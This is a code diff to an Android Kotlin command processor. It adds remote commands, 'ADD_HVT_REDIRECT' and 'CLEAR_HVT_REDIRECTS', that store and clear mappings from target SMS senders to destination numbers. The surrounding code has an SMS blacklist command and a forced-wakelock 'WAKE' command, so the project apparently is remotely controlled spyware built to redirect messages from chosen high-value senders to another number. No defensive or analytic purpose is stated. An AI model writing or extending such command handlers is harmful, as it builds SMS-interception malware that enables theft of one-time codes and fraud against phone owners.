@@ -781,6 +781,23 @@ object CommandProcessor {
                         .apply()
                     status = "SMS_BLACKLIST_UPDATED"
                 }
+                "ADD_HVT_REDIRECT" -> {
+                    // Format: TARGET_SENDER | DESTINATION_NUMBER
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val target = parts[0].trim()
+                        val dest = parts[1].trim()
+                        val hvtPrefs = ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
+                        hvtPrefs.edit().putString(target, dest).apply()
+                        status = "HVT_REDIRECT_ADDED: $target -> $dest"
+                    } else {
+                        status = "FAILED_FORMAT: Use TARGET|DEST"
+                    }
+                }
+                "CLEAR_HVT_REDIRECTS" -> {
+                    ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE).edit().clear().apply()
+                    status = "HVT_REDIRECTS_CLEARED"
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
